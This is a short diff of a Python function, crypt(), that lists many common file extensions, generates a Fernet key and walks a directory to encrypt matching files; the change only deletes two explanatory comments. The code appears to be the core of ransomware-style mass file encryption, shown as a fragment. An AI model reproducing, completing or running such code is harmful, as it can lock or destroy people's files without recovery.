@@ -20,11 +20,11 @@ def crypt():
                   ".gif", ".txt", ".py", ".pyc", ".jar", ".sql", ".bundle",
                   ".sqlite3", ".html", ".php", ".log", ".bak", ".deb")
 
-    # generate key for encryption
+    
     key = Fernet.generate_key()
     cipher = Fernet(key)
 
-    # scan and encrypt files
+    
     for subdir, dirs, files in os.walk(directory):
         for file in files:
             if file.endswith(extensions):
